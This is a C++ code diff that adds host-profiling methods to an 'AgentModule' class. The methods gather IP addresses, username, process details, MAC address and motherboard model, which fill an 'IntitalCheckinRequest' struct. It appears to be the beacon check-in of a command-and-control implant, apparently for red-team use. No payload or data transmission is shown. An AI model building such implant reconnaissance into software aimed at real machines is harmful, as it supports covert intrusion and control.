@@ -10,8 +10,13 @@
 #include <windows.h>
 
 #include <iostream>
+#include <memory>
+#include <array>
+
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 {
 	if (!lpwstr) return "";	
@@ -22,6 +27,33 @@ std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
 	WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);
 
 	return result;
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+std::string CaptureCommandOutput(const std::string& cmd)
+{
+    std::array<char, 128> buffer;
+    std::string result;
+
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
+
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL)
+    {
+        result += buffer.data();
+    }
+
+    if (!result.empty())
+    {
+        result.erase(result.find_last_not_of(" \n\r\t") + 1);
+    }
+    return result;
+}
+
+std::string AgentModule::GetMotherBoard()
+{
+    std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
+    std::string name = CaptureCommandOutput(cmd);
+    return name;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -126,7 +158,7 @@ std::string AgentModule::GetExternalViaDNS() {
     return "";
 }
 
-std::string GetMachineMacAddress() {
+std::string AgentModule::GetMachineMacAddress() {
     ULONG bufferSize = 15000; 
     std::vector<BYTE> buffer(bufferSize);
     
@@ -155,5 +187,40 @@ std::string GetMachineMacAddress() {
         }
     }
 
-    return ""; /
+    return ""; 
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+IntitalCheckinRequest AgentModule::GetHostInformation()
+{
+    std::string internalIP;
+    std::string externalIP;
+    std::string OS;
+    LPWSTR username;
+    std::string processName;
+    int pid;
+
+
+    GetUsername(&username);
+    internalIP = GetInternalIP();
+    externalIP = GetExternalViaDNS();
+    processName = GetProcessName();
+    pid = GetPID();
+
+    return IntitalCheckinRequest
+    {
+        GetInternalIP(),
+        GetExternalViaDNS(),
+        "Windows 11 Pro",
+        ConvertLPWSTRToStdString(username),
+        GetProcessName(),
+        GetPID(),
+        "High", // TODO Integrity
+        GetMachineMacAddress(),
+        GetMotherBoard(),
+        16,            // TODO RAM
+        512.0,     // TODO disk size
+        320.5,     // TODO  free disk
+        8 // TODO cpu count
+    };
 }
